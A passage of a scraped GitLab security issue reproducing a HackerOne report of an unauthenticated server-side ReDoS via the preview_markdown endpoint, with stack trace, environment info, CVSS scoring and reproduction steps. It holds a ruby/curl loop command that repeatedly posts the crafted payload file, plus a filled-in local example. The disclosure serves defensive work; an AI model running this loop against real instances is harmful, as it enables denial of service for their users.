class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eapp/controllers/application_controller.rb:524:in `set_current_admin&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC29\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/session.rb:11:in `with_session&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC30\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eapp/controllers/application_controller.rb:515:in `set_session_storage&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC31\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/i18n.rb:107:in `with_locale&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC32\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eapp/controllers/application_controller.rb:508:in `set_locale&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC33\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eapp/controllers/application_controller.rb:499:in `set_current_context&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC34\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/metrics/elasticsearch_rack_middleware.rb:16:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC35\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/memory_report.rb:13:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC36\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/speedscope.rb:13:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC37\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/database/load_balancing/rack_middleware.rb:23:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC38\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/rails_queue_duration.rb:33:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC39\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/metrics/rack_middleware.rb:16:in `block in call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC40\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/metrics/web_transaction.rb:46:in `run&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC41\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/metrics/rack_middleware.rb:16:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC42\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/jira/middleware.rb:19:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC43\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/go.rb:20:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC44\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/etag_caching/middleware.rb:21:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC45\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/query_analyzer.rb:11:in `block in call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC46\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/database/query_analyzer.rb:37:in `within&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC47\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/query_analyzer.rb:11:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC48\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/multipart.rb:173:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC49\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/read_only/controller.rb:50:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC50\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/read_only.rb:18:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC51\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/same_site_cookies.rb:27:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC52\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/basic_health_check.rb:25:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC53\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/handle_malformed_strings.rb:21:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC54\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC55\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/request_context.rb:21:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC56\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/webhook_recursion_detection.rb:15:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC57\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003econfig/initializers/fix_local_cache_middleware.rb:11:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC58\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/compressed_json.rb:37:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC59\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/rack_multipart_tempfile_factory.rb:19:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC60\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/sidekiq_web_static.rb:20:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC61\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/metrics/requests_rack_middleware.rb:79:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC62\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/gitlab/middleware/release_env.rb:13:in `call&#39;  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;320:1-320:24\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-output-of-checks\&quot; class=\&quot;anchor\&quot; href=\&quot;#output-of-checks\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eOutput of checks\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;321:1-322:72\&quot; dir=\&quot;auto\&quot;\u003eThis bug happens on the official Docker installation of GitLab Enterprise Edition \u003ccode data-sourcepos=\&quot;321:84-321:93\&quot;\u003e15.11.0-ee\u003c/code\u003e.\u003cbr data-sourcepos=\&quot;321:98-321:98\&quot;\u003e\u0026#x000A;I used \u003ccode data-sourcepos=\&quot;322:9-322:20\&quot;\u003eChromium 112\u003c/code\u003e and \u003ccode data-sourcepos=\&quot;322:28-322:38\&quot;\u003eFirefox 112\u003c/code\u003e on Debian 11 to verify this bug.\u003c/p\u003e\u0026#x000A;\u003ch6 data-sourcepos=\&quot;324:1-324:44\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-results-of-gitlab-environment-info\&quot; class=\&quot;anchor\&quot; href=\&quot;#results-of-gitlab-environment-info\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eResults of GitLab environment info\u003c/h6\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;325:1-325:47\&quot; dir=\&quot;auto\&quot;\u003eOutput of \u003ccode data-sourcepos=\&quot;325:12-325:43\&quot;\u003esudo gitlab-rake gitlab:env:info\u003c/code\u003e:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;326:1-360:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSystem information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSystem:\t\t  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eProxy:\t\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eCurrent User:\tgit  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing RVM:\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRuby Version:\t3.0.6p216  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGem Version:\t3.2.33  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eBundler Version:2.3.15  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRake Version:\t13.0.6  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRedis Version:\t6.2.11  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSidekiq Version:6.5.7  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGo Version:\tunknown\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eVersion:\t15.11.0-ee  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRevision:\t4dce6bc3728  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDB Adapter:\tPostgreSQL  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eDB Version:\t13.8  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eURL:\t\thttp://my-gitlab-h1.test  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eHTTP Clone URL:\thttp://my-gitlab-h1.test/some-group/some-project.git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eSSH Clone URL:\tgit@my-gitlab-h1.test:some-group/some-project.git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC23\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eElasticsearch:\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC24\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGeo:\t\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC25\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing LDAP:\tno  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC26\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eUsing Omniauth:\tyes  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC27\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eOmniauth Providers: \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC28\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC29\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab Shell  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC30\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eVersion:\t14.18.0  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC31\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eRepository storages:  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC32\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e- default: \tunix:/var/opt/gitlab/gitaly/gitaly.socket  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC33\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;362:1-362:12\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;364:1-365:201\&quot; dir=\&quot;auto\&quot;\u003eBy exploiting this ReDoS vulnerability, an unauthenticated attacker could significantly reduce the availability of the entire the GitLab instance.\u003cbr data-sourcepos=\&quot;364:149-364:149\&quot;\u003e\u0026#x000A;Based on \u003ca data-sourcepos=\&quot;365:10-365:99\&quot; href=\&quot;https://hackerone.com/gitlab?view_policy=true\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ethe policy of GitLab&#39;s Bug Bounty Program\u003c/a\u003e, past reports, and my research on the impact of this bug, I would suggest the following CVSS score:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;366:1-369:5\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e7.5 (High)  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;370:1-370:93\&quot; dir=\&quot;auto\&quot;\u003eI would also like to add some detailed explanations of the notable points in the above score.\u003c/p\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;372:1-375:183\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;372:1-373:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;372:3-372:121\&quot;\u003e\u003ccode data-sourcepos=\&quot;372:4-372:7\&quot;\u003ePR:N\u003c/code\u003e : As described in the \&quot;Steps to reproduce\&quot; section, this attack can be performed by an unauthenticated attacker.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;374:1-375:183\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;374:3-375:183\&quot;\u003e\u003ccode data-sourcepos=\&quot;374:4-374:6\&quot;\u003eA:H\u003c/code\u003e : This ReDoS attack causes enough load to meet the \u003ccode data-sourcepos=\&quot;374:61-374:63\&quot;\u003eA:H\u003c/code\u003e criteria for the \u003ca data-sourcepos=\&quot;374:83-374:190\&quot; href=\&quot;https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003e1k Reference Architecture\u003c/a\u003e as stated in \u003ca data-sourcepos=\&quot;374:205-374:299\&quot; href=\&quot;https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eGitLab CVSS Calculator page\u003c/a\u003e.\u003cbr data-sourcepos=\&quot;374:303-374:303\&quot;\u003e\u0026#x000A;More specifically, this attack clearly satisfies the \&quot;Clarifying notes\&quot; condition in \u003ca data-sourcepos=\&quot;375:88-375:182\&quot; href=\&quot;https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eGitLab CVSS Calculator page\u003c/a\u003e.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003cblockquote data-sourcepos=\&quot;376:1-376:361\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;376:3-376:361\&quot;\u003eWhen evaluating Availability impacts for DoS that require sustained traffic, use the \u003ca data-sourcepos=\&quot;376:88-376:195\&quot; href=\&quot;https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003e1k Reference Architecture\u003c/a\u003e. The number of requests must be fewer than the \&quot;test request per seconds rates\&quot; and cause 10+ seconds of user-perceivable unavailability to rate the impact as \u003ccode data-sourcepos=\&quot;376:357-376:359\&quot;\u003eA:H\u003c/code\u003e.\u003c/p\u003e\u0026#x000A;\u003c/blockquote\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;378:1-378:123\&quot; dir=\&quot;auto\&quot;\u003eIn addition to the above, it is important to note that any feature with Markdown fields is vulnerable to this ReDoS attack.\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;380:1-380:14\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-attachments\&quot; class=\&quot;anchor\&quot; href=\&quot;#attachments\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eAttachments\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;382:1-382:77\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;382:1-382:12\&quot;\u003eWarning:\u003c/strong\u003e Attachments received through HackerOne, please exercise caution!\u003c/p\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;384:1-393:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;384:1-384:153\&quot;\u003e\u003ca data-sourcepos=\&quot;384:3-384:153\&quot; href=\&quot;https://h1.sec.gitlab.net/a/1892d7aa-a873-45b2-ab68-9926e8fa5cb2/ProjectReferenceFilter_ReDoS_payload.json\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eProjectReferenceFilter_ReDoS_payload.json\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;385:1-385:133\&quot;\u003e\u003ca data-sourcepos=\&quot;385:3-385:133\&quot; href=\&quot;https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ecreate_public_group_updated.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;386:1-386:99\&quot;\u003e\u003ca data-sourcepos=\&quot;386:3-386:99\&quot; href=\&quot;https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ecsrf_token.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;387:1-387:105\&quot;\u003e\u003ca data-sourcepos=\&quot;387:3-387:105\&quot; href=\&quot;https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003esession_value.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;388:1-388:127\&quot;\u003e\u003ca data-sourcepos=\&quot;388:3-388:127\&quot; href=\&quot;https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ehtop_all_cores_exhausted.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;389:1-389:107\&quot;\u003e\u003ca data-sourcepos=\&quot;389:3-389:107\&quot; href=\&quot;https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eresponse_delay.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;390:1-390:97\&quot;\u003e\u003ca data-sourcepos=\&quot;390:3-390:97\&quot; href=\&quot;https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003e500_error.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;391:1-391:109\&quot;\u003e\u003ca data-sourcepos=\&quot;391:3-391:109\&quot; href=\&quot;https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003efailed_pipeline.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;392:1-393:0\&quot;\u003e\u003ca data-sourcepos=\&quot;392:3-392:117\&quot; href=\&quot;https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003efailed_jobs_timeout.png\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;394:1-394:19\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-how-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#how-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eHow To Reproduce\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;396:1-396:57\&quot; dir=\&quot;auto\&quot;\u003ePlease add \u003ca data-sourcepos=\&quot;396:12-396:40\&quot; href=\&quot;https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ereproducibility information\u003c/a\u003e to this section:\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;398:1-401:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;398:1-398:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;399:1-399:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;400:1-400:2\&quot;\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e&quot;,&quot;initialDescriptionText&quot;:&quot;:warning: **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**\n\n**[HackerOne report #1963255](https://hackerone.com/reports/1963255)** by `ryhmnlfj` on 2023-04-27:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n####  Summary\n\nI found the server-side ReDoS via `ProjectReferenceFilter` in any Markdown fields.  \nAn attacker can take down the GitLab instance by sending the **unauthenticated requests** which contain the crafted payload to the `preview_markdown` endpoint.\n\n####  Preparation before reproducing the bug\n\nPlease install the command line tools `ruby` and `curl` on your computer.  \nAlso, please download `ProjectReferenceFilter_ReDoS_payload.json` attached to this report.  \nThese will be used in step 11 of the \&quot;Steps to reproduce\&quot; section.\n\nAnd most importantly, please prepare a GitLab instance that you can use personally.  \n**DO NOT try to reproduce this bug against `gitlab.com` or other public instances.**\n\n####  Steps to reproduce\n\n1. Set up and launch your GitLab instance, and create a new account on it.  \n2. Sign in to the account you created in step 1.  \n3. Create a new **public group** and make a note of **the public group name** at this time.  \n   At the same time, make a note of **the base URL with scheme** shown in \&quot;Group URL\&quot;.\n\n![create_public_group_updated.png](https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png)\n\n4. Sign out as you will be accessing as an unauthenticated user in the following steps.  \n5. After launching your browser&#39;s developer tools, browse to the **public group** you created in step 3 as an unauthenticated user.  \n6. Check the HTML rendered in step 5 and take a note of the content of `csrf-token` at this time.\n\n![csrf_token.png](https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png)\n\n7. Check the request sent to your GitLab instance in step 5 and take a note the value of `_gitlab_session` at this time.\n\n![session_value.png](https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png)\n\n8. Close your browser and open a command console.  \n9. Let&#39;s construct the command to demonstrate the ReDoS. Replace each string in the command template according to the replacement table.\n\n* Command template:  \n```  \nruby -e &#39;while true do p spawn(\&quot;curl --header Content-Type:application/json --header X-CSRF-Token:[CSRF_TOKEN_VALUE] --header Cookie:_gitlab_session=[SESSION_VALUE] --data [@]ProjectReferenceFilter_ReDoS_payload.json [BASE_URL_WITH_SCHEME]groups/[PUBLIC_GROUP_NAME]/preview_markdown\&quot;); sleep 1; end&#39;  \n```  \n* Replacement table:\n\n| String in the command template  | Replace with                                   |  \n|---------------------------------|------------------------------------------------|  \n| `[CSRF_TOKEN_VALUE]`            | the content of `csrf-token` noted in step 6    |  \n| `[SESSION_VALUE]`               | the value of `_gitlab_session` noted in step 7 |  \n| `[BASE_URL_WITH_SCHEME]`        | **the base URL with scheme** noted in step 3   |  \n| `[PUBLIC_GROUP_NAME]`           | **the public group name** noted in step 3      |\n\nFor reference, here&#39;s an example in my local environment:  \n```  \nruby -e &#39;while true do p spawn(\&quot;curl --header Content-Type:application/json --header X-CSRF-Token:E_NhtPEqA7IpGGSH0jgsfRtruz5fAeeqRxQgBn-kl2mCkdxxBHP4HC9YdK6_mDdZqxCkhzkjSzESZOvAGwJQPQ --header Cookie:_gitlab_session=26c454aeadefc013a10a0fdddabcfd12 --data [@]ProjectReferenceFilter_ReDoS_payload.json http://my-gitlab-h1.test/groups/public_group_for_test/preview_markdown\&quot;); sleep 1; end&#39;  \n```\n\n10. Change the current 